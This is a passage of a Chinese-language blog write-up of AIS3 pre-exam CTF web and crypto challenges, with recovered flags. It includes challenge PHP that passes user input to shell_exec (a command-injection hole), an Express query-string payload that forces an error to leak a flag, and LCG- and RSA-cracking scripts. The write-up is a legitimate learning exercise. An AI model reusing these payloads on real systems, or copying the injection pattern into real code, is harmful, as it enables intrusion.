class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;dir&quot;</span> <span class="attr">value</span>=<span class="string">&quot;./&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;List!&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;?php if ($dir = @$_GET[&#x27;dir&#x27;]): ?&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">pre</span>&gt;</span>Output:</span><br><span class="line">&lt;?= shell_exec(&quot;ls -al &#x27;$dir&#x27;&quot;) ?&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">&lt;?php endif; exit; ?&gt;</span><br><span class="line">AIS3&#123;y0u_4r3_4bl3_70_d1v3_d33p3r_n3x7_71m3&#125;</span><br></pre></td></tr></table></figure>

<h3 id="tokeeeeen"><a href="#tokeeeeen" class="headerlink" title="tokeeeeen"></a>tokeeeeen</h3><p>如果沒有CTFd裡的hint的話，我覺得這題還真的有點通靈ww</p>
<p>總之我們發現他是個node的project，所以去讀個package.json</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;server&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;server&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;main&quot;</span>: <span class="string">&quot;server.js&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;start&quot;</span>: <span class="string">&quot;node server.js&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;djsoix&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;license&quot;</span>: <span class="string">&quot;ISC&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;express&quot;</span>: <span class="string">&quot;^4.16.4&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;morgan&quot;</span>: <span class="string">&quot;^1.9.1&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>發現server擺在server.js，嘗試去讀了code後就拿到原始碼了</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> FLAG = process.env.FLAG;</span><br><span class="line"><span class="keyword">const</span> HOST = process.env.HOST;</span><br><span class="line"><span class="keyword">const</span> PORT = process.env.PORT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> morgan = <span class="built_in">require</span>(<span class="string">&#x27;morgan&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> app = express();</span><br><span class="line">app.use(morgan(<span class="string">&#x27;:remote-addr :method :url&#x27;</span>)); <span class="comment">// logging</span></span><br><span class="line">app.use(<span class="string">&#x27;/&#x27;</span>, express.static(<span class="string">&#x27;./&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TokenError</span> <span class="keyword">extends</span> <span class="title">Error</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/flag&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> token = req.query.token;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(token);</span><br><span class="line">    <span class="built_in">console</span>.log(token.length.__proto__)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!token)</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> TokenError(<span class="string">&#x27;Not provided.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (token.length &gt; <span class="number">32</span>)</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> TokenError(<span class="string">`Bro, <span class="subst">$&#123;token.length&#125;</span> is too long!`</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &lt; token.length &lt; <span class="number">16</span>)</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> TokenError(<span class="string">&#x27;No, please.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">if</span> (e <span class="keyword">instanceof</span> TokenError) &#123;</span><br><span class="line">      res.send(e.message);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  res.send(FLAG);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(PORT, HOST);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以知道只要送對東西到/flag就可以拿到flag了，於是開始研究code，發現他很神奇的自己弄了一個新的Error Type出來，而且還有try catch，所以猜想可能是要自己讓他噴出一個其他的error就可以拿到flag</p>
<p>研究了一下發現express內建的parser，讓我們的get是可以送出一個object的，想了想發現比大小的時候可能會呼叫某種operator，於是嘗試覆蓋掉，最後找到是要覆蓋掉toString，因次構造出payload<code>http://pre-exam-web.ais3.org:10102/flag?token[length][__proto__][toString]=1</code></p>
<p>就拿到flag: <code>AIS3&#123;1_d0n7_w4n7_70_wr173_j4v45cr1p7_4nym0r3&#125;</code>了</p>
<h3 id="BabySSRF"><a href="#BabySSRF" class="headerlink" title="BabySSRF"></a>BabySSRF</h3><p>時間不是很足，看完orange的「SSRF-從入門到放棄」，還是不知道要幹嘛，雖然好像他們是有開gopher之類的，但真的不會利用，最後就放棄</p>
<p>哪天應該要在網路上或去問人如何SSRF</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="TCash"><a href="#TCash" class="headerlink" title="TCash"></a>TCash</h3><p>拿到task.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5,sha256</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line">cand = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPWRSTUVWXYZ1234567890@,- _&#123;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">md5s = []</span><br><span class="line">sha256s = []</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> FLAG :</span><br><span class="line">    <span class="keyword">assert</span> f <span class="keyword">in</span> cand </span><br><span class="line">    md5s.append( <span class="built_in">int</span>(md5(f.encode()).hexdigest(),<span class="number">16</span>)%<span class="number">64</span> )</span><br><span class="line">    sha256s.append( <span class="built_in">int</span>(sha256(f.encode()).hexdigest(),<span class="number">16</span>)%<span class="number">64</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># md5s = [41, 63, 46, 51, 6, 26, 42, 50, 44, 33, 29, 50, 27, 28, 30, 17, 31, 19, 46, 50, 33, 45, 26, 26, 29, 31, 52, 33, 1, 45, 31, 22, 50, 50, 50, 50, 50, 31, 22, 50, 44, 26, 44, 49, 50, 49, 26, 45, 31, 30, 22, 44, 30, 31, 17, 50, 50, 50, 31, 43, 52, 50, 53, 31, 30, 17, 26, 31, 46, 41, 44, 26, 31, 52, 50, 30, 31, 26, 39, 31, 46, 33, 27, 1, 42, 50, 31, 30, 12, 26, 27, 52, 31, 30, 12, 31, 46, 26, 27, 14, 50, 31, 22, 52, 33, 31, 41, 50, 46, 31, 22, 23, 41, 31, 53, 26, 21, 31, 33, 30, 31, 19, 39, 51, 33, 30, 39, 51, 12, 58, 60, 31, 41, 33, 53, 31, 3, 17, 50, 31, 51, 26, 29, 52, 31, 33, 22, 26, 31, 41, 51, 54, 41, 29, 52, 31, 19, 23, 33, 30, 44, 26, 27, 38, 8, 50, 29, 15]</span></span><br><span class="line"><span class="comment"># sha256s = [61, 44, 3, 14, 22, 41, 43, 30, 49, 59, 58, 30, 11, 3, 24, 35, 40, 46, 3, 42, 59, 36, 41, 41, 41, 40, 9, 59, 23, 36, 40, 33, 42, 42, 42, 42, 42, 40, 44, 42, 49, 24, 49, 28, 42, 33, 24, 36, 40, 24, 33, 10, 24, 40, 35, 42, 42, 42, 40, 39, 9, 42, 3, 40, 24, 35, 24, 40, 3, 61, 49, 24, 40, 9, 42, 24, 40, 41, 17, 40, 12, 57, 11, 23, 43, 42, 40, 24, 18, 41, 11, 9, 40, 24, 18, 40, 3, 41, 11, 12, 42, 40, 44, 9, 59, 40, 61, 42, 3, 40, 44, 13, 61, 40, 3, 24, 29, 40, 59, 24, 40, 19, 18, 6, 59, 24, 18, 6, 22, 0, 39, 40, 61, 57, 3, 40, 17, 35, 42, 40, 58, 24, 58, 9, 40, 59, 44, 24, 40, 61, 48, 52, 61, 58, 9, 40, 19, 13, 59, 24, 53, 41, 11, 55, 55, 42, 58, 18]</span></span><br></pre></td></tr></table></figure>

<p>所以就照著算一下md5跟sha256，不過要記得break，因為有碰撞，所以不break會多一些字</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5,sha256</span><br><span class="line">cand = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPWRSTUVWXYZ1234567890@,- _&#123;&#125;&#x27;</span></span><br><span class="line">md5s = [<span class="number">41</span>, <span class="number">63</span>, <span class="number">46</span>, <span class="number">51</span>, <span class="number">6</span>, <span class="number">26</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">44</span>, <span class="number">33</span>, <span class="number">29</span>, <span class="number">50</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">30</span>, <span class="number">17</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">46</span>, <span class="number">50</span>, <span class="number">33</span>, <span class="number">45</span>, <span class="number">26</span>, <span class="number">26</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">52</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">45</span>, <span class="number">31</span>, <span class="number">22</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">31</span>, <span class="number">22</span>, <span class="number">50</span>, <span class="number">44</span>, <span class="number">26</span>, <span class="number">44</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">26</span>, <span class="number">45</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">44</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">17</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">31</span>, <span class="number">43</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">17</span>, <span class="number">26</span>, <span class="number">31</span>, <span class="number">46</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">26</span>, <span class="number">31</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">26</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">46</span>, <span class="number">33</span>, <span class="number">27</span>, <span class="number">1</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">12</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">12</span>, <span class="number">31</span>, <span class="number">46</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">14</span>, <span class="number">50</span>, <span class="number">31</span>, <span class="number">22</span>, <span class="number">52</span>, <span class="number">33</span>, <span class="number">31</span>, <span class="number">41</span>, <span class="number">50</span>, <span class="number">46</span>, <span class="number">31</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">41</span>, <span class="number">31</span>, <span class="number">53</span>, <span class="number">26</span>, <span class="number">21</span>, <span class="number">31</span>, <span class="number">33</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">39</span>, <span class="number">51</span>, <span class="number">33</span>, <span class="number">30</span>, <span class="number">39</span>, <span class="number">51</span>, <span class="number">12</span>, <span class="number">58</span>, <span class="number">60</span>, <span class="number">31</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">53</span>, <span class="number">31</span>, <span class="number">3</span>, <span class="number">17</span>, <span class="number">50</span>, <span class="number">31</span>, <span class="number">51</span>, <span class="number">26</span>, <span class="number">29</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">33</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">31</span>, <span class="number">41</span>, <span class="number">51</span>, <span class="number">54</span>, <span class="number">41</span>, <span class="number">29</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">33</span>, <span class="number">30</span>, <span class="number">44</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">38</span>, <span class="number">8</span>, <span class="number">50</span>, <span class="number">29</span>, <span class="number">15</span>]</span><br><span class="line">sha256s = [<span class="number">61</span>, <span class="number">44</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">22</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">30</span>, <span class="number">49</span>, <span class="number">59</span>, <span class="number">58</span>, <span class="number">30</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">24</span>, <span class="number">35</span>, <span class="number">40</span>, <span class="number">46</span>, <span class="number">3</span>, <span class="number">42</span>, <span class="number">59</span>, <span class="number">36</span>, <span class="number">41</span>, <span class="number">41</span>, <span class="number">41</span>, <span class="number">40</span>, <span class="number">9</span>, <span class="number">59</span>, <span class="number">23</span>, <span class="number">36</span>, <span class="number">40</span>, <span class="number">33</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">40</span>, <span class="number">44</span>, <span class="number">42</span>, <span class="number">49</span>, <span class="number">24</span>, <span class="number">49</span>, <span class="number">28</span>, <span class="number">42</span>, <span class="number">33</span>, <span class="number">24</span>, <span class="number">36</span>, <span class="number">40</span>, <span class="number">24</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">35</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">40</span>, <span class="number">39</span>, <span class="number">9</span>, <span class="number">42</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">24</span>, <span class="number">35</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">3</span>, <span class="number">61</span>, <span class="number">49</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">9</span>, <span class="number">42</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">17</span>, <span class="number">40</span>, <span class="number">12</span>, <span class="number">57</span>, <span class="number">11</span>, <span class="number">23</span>, <span class="number">43</span>, <span class="number">42</span>, <span class="number">40</span>, <span class="number">24</span>, <span class="number">18</span>, <span class="number">41</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">40</span>, <span class="number">24</span>, <span class="number">18</span>, <span class="number">40</span>, <span class="number">3</span>, <span class="number">41</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">42</span>, <span class="number">40</span>, <span class="number">44</span>, <span class="number">9</span>, <span class="number">59</span>, <span class="number">40</span>, <span class="number">61</span>, <span class="number">42</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">44</span>, <span class="number">13</span>, <span class="number">61</span>, <span class="number">40</span>, <span class="number">3</span>, <span class="number">24</span>, <span class="number">29</span>, <span class="number">40</span>, <span class="number">59</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">19</span>, <span class="number">18</span>, <span class="number">6</span>, <span class="number">59</span>, <span class="number">24</span>, <span class="number">18</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">61</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">17</span>, <span class="number">35</span>, <span class="number">42</span>, <span class="number">40</span>, <span class="number">58</span>, <span class="number">24</span>, <span class="number">58</span>, <span class="number">9</span>, <span class="number">40</span>, <span class="number">59</span>, <span class="number">44</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">61</span>, <span class="number">48</span>, <span class="number">52</span>, <span class="number">61</span>, <span class="number">58</span>, <span class="number">9</span>, <span class="number">40</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">59</span>, <span class="number">24</span>, <span class="number">53</span>, <span class="number">41</span>, <span class="number">11</span>, <span class="number">55</span>, <span class="number">55</span>, <span class="number">42</span>, <span class="number">58</span>, <span class="number">18</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(md5s)) :</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cand:</span><br><span class="line">        m = <span class="built_in">int</span>(md5(c.encode()).hexdigest(),<span class="number">16</span>)%<span class="number">64</span></span><br><span class="line">        s = <span class="built_in">int</span>(sha256(c.encode()).hexdigest(),<span class="number">16</span>)%<span class="number">64</span></span><br><span class="line">        <span class="keyword">if</span> m == md5s[i] <span class="keyword">and</span> s == sha256s[i]:</span><br><span class="line">            print(c, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>跑起來就有flag: <code>AIS3&#123;0N_May_16th @Sead00g said Heeeee ReMEMBerEd tH4t heee UseD thE SAME set 0f On1iNe to01s to S01Ve Rsa AeS RCA DE5 at T-cat-cup, AnD 7he kEys aRE AlWAys TCat2019Key&#125;</code>了</p>
<h3 id="Random-Guess"><a href="#Random-Guess" class="headerlink" title="Random Guess"></a>Random Guess</h3><p>nc上去發現是一個LCG，我們要透過前幾項推測出後面的項數，<del>抄襲</del>參考<a target="_blank" rel="noopener" href="http://zeroyu.xyz/2018/11/02/Cracking-LCG/">網路上的教學</a>後</p>
<p>寫了個小腳本: </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from http://zeroyu.xyz/2018/11/02/Cracking-LCG/</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a <span class="keyword">if</span> b == <span class="number">0</span> <span class="keyword">else</span> gcd(b, a%b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, x, y = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, y - (b // a) * x, x)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span>(<span class="params">b, n</span>):</span></span><br><span class="line">    g, x, _ = egcd(b, n)</span><br><span class="line">    <span class="keyword">if</span> g == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> x % n</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;can&#x27;t find&quot;</span></span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_increment</span>(<span class="params">states, modulus, multiplier</span>):</span></span><br><span class="line">    increment = (states[<span class="number">1</span>] - states[<span class="number">0</span>]*multiplier) % modulus</span><br><span class="line">    <span class="keyword">return</span> modulus, multiplier, increment</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_multiplier</span>(<span class="params">states, modulus</span>):</span></span><br><span class="line">    multiplier = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * modinv(states[<span class="number">1</span>] - states[<span class="number">0</span>], modulus) % modulus</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_increment(states, modulus, multiplier)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_modulus</span>(<span class="params">states</span>):</span></span><br><span class="line">    diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> <span class="built_in">zip</span>(states, states[<span class="number">1</span>:])]</span><br><span class="line">    zeroes = [t2*t0 - t1*t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> <span class="built_in">zip</span>(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]</span><br><span class="line">    modulus = <span class="built_in">abs</span>(reduce(gcd, zeroes))</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_multiplier(states, modulus)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;pre-exam-chals.ais3.org&#x27;</span>,<span class="number">10200</span>)</span><br><span class="line">r.readline()</span><br><span class="line">r.readline()</span><br><span class="line">data = r.readline()</span><br><span class="line">data = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, data[<span class="number">4</span>:].split(<span class="string">&quot;, &quot;</span>)))</span><br><span class="line">c, a, b = crack_unknown_modulus(data)</span><br><span class="line">r.readline()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (a*x+b)%c</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)-<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span> data[i+<span class="number">1</span>] == f(data[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    data.append(f(data[-<span class="number">1</span>]))</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(data[-<span class="number">1</span>]))</span><br><span class="line">    print(r.readline())</span><br><span class="line">print(r.readline())</span><br></pre></td></tr></table></figure>

<p>多跑個幾次就有flag:<code>AIS3&#123;GGEZ!!LiNe42_COngRuen7i4l_6eNErATor&#125;</code></p>
<h3 id="RSA202"><a href="#RSA202" class="headerlink" title="RSA202"></a>RSA202</h3><p>原本是靜態的但不知道被誰上傳到<a target="_blank" rel="noopener" href="http://factordb.com/">factordb</a>後就換成線上版的了</p>
<p>nc上去拿到一些RSA相關的東東，不過每次都會變</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Preparing your challenge ... </span><br><span class="line">Ok!</span><br><span class="line">e : 864113707</span><br><span class="line">n1 : r * next_prime(r)</span><br><span class="line">2057637689979828868813778966487602527209303374258467327917196568947192873175632809097258233657191113718352591488110926780757806441760348124791111343267835274407662982399393675992879</span><br><span class="line">n2 : p * q</span><br><span class="line">52324184179324772453567686834250882723630118511185655714317932103711417589175797939573332873099260469242216498689581568031678173107216997746660224652721235912984358738640983973115478887931172285179742938781274485931959933349677416096702436527739779870479999618673233703186586960457706268041334529037344843256703652406335264659743218661834035898362783667719250368615062040885895287829560032620689231868872595799426612194084809606208048885585965328105674673834797661057424408246796809441619231338240995503934767634707270556055795760076213594857650879033938797126845131860640561153578898075877872426580921874030308053204093096787108058577144476899098461224027875712499277234689895745715617945925302803608738746541765563963303</span><br><span class="line">enc : pow(FLAG1, e, n1)</span><br><span class="line">387415330369921039675317645883541936754820942612468619752309606008705861535452598131281548560939304937737759352180910688332403919941423608817560841574270069589283312766542410026522</span><br><span class="line">enc : pow(FLAG2, e, n2)</span><br><span class="line">48264566649163579775541249602255661719485610106238546996562919642942055547568668447739660899827057293898629259928388725902938220701630188964438226746386836169053052027396749334813660706329526730060443657011646221651175213929244636809008552834462591292137128764372202724908618414429479798043318327808910712187787245468978546915344165339506796983087666931853014485790809490154996482442220135897441354075233257956366801863667266092777768366472307826595455393240841688439420895802066059677886547065091448829618699215431241678126859222074293763997229515179364728219178737344116298779714667120742532926824597568297485559226067857068290363389373630910997580719271636739520480166023650910008203597304143344236333492247162620036539</span><br><span class="line"></span><br><span class="line">p,q,r are prime numbers.</span><br><span class="line"></span><br><span class="line">((p-1) % r)**2 + ((r**5 - 1) % p)**2 &#x3D;&#x3D; 0</span><br><span class="line"></span><br><span class="line">Good luck !!</span><br></pre></td></tr></table></figure>

<p>暴力拿yafu拆開n1後觀察給的怪提示<code>((p-1) % r)**2 + ((r**5 - 1) % p)**2 == 0</code></p>
<p>發現$r | p - 1$以及$p | (r - 1)(r^4 + r^3 + r^2 + r + 1)$，所以$p=r^4+r^3+r^2+r+1$(因為$r|p-1 \rightarrow r &lt; p-1$)，這樣我們就有p跟q，剩下就是暴力把密碼解回來了</p>
<p>寫了個腳本(資料跟上面的那份不同，不過flag一樣)</p>
